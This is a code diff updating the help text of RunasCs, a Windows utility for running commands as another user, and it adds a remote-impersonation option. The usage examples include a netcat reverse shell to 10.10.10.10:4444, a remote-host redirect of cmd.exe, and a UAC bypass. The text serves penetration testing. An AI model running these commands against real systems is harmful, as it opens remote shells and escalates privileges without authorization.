@@ -1651,11 +1651,11 @@ public static class AccessToken{
 
 public static class RunasCsMainClass
 {
-    private static string help = @"
+    private static readonly string help = @"
 RunasCs v1.5 - @splinter_code
 
 Usage:
-    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac]
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]
 
 Description:
     RunasCs is an utility to run specific processes under a different user account
@@ -1681,42 +1681,46 @@ Optional arguments:
                             1 - CreateProcessWithTokenW
                             2 - CreateProcessWithLogonW
     -l, --logon-type logon_type
-                            the logon type for the spawned process.
+                            the logon type for the token of the new process.
                             Default: ""2"" - Interactive
-    -r, --remote host:port
-                            redirect stdin, stdout and stderr to a remote host.
-                            Using this option sets the process timeout to 0.
     -t, --timeout process_timeout
                             the waiting time (in ms) for the created process.
                             This will halt RunasCs until the spawned process
                             ends and sent the output back to the caller.
-                            If you set 0 no output will be retrieved and an 
-                            async process will be created.
+                            If you set 0 no output will be retrieved and a 
+                            background process will be created.
                             Default: ""120000""
+    -r, --remote host:port
+                            redirect stdin, stdout and stderr to a remote host.
+                            Using this option sets the process_timeout to 0.
     -p, --force-profile
-                            if this flag is specified RunasCs will force the
-                            creation of the user profile on the machine.
+                            force the creation of the user profile on the machine.
                             This will ensure the process will have the
                             environment variables correctly set.
-                            NOTE: This will create the user profile directory.
+                            WARNING: If non-existent, it creates the user profile
+                            directory in the C:\Users folder.
     -b, --bypass-uac     
-                            if this flag is specified RunasCs will try a UAC
-                            bypass to spawn a process without token limitation
-                            (not filtered).
+                            try a UAC bypass to spawn a process without
+                            token limitations (not filtered).
+    -i, --remote-impersonation     
+                            spawn a new process and assign the token of the 
+                            logged on user to the main thread.
 
 Examples:
-    Run a command as a specific local user
+    Run a command as a local user
         RunasCs.exe user1 password1 ""cmd /c whoami /all""
-    Run a command as a specific domain user and interactive logon type (2)
-        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 2
-    Run a background/async process as a specific local user,
-        RunasCs.exe user1 password1 ""C:\\nc64.exe 10.10.10.10 4444 -e cmd.exe"" -t 0
+    Run a command as a domain user and logon type as NetworkCleartext (8)
+        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 8
+    Run a background process as a local user,
+        RunasCs.exe user1 password1 ""C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe"" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
     Run a command simulating the /netonly flag of runas.exe 
-        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 9
+        RunasCs.exe user1 password1 ""cmd /c whoami /all"" -l 9
     Run a command as an Administrator bypassing UAC
         RunasCs.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac
+    Run a command as an Administrator through remote impersonation
+        RunasCs.exe adm1 password1 ""cmd /c echo admin > C:\Windows\admin"" -l 8 --remote-impersonation 
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
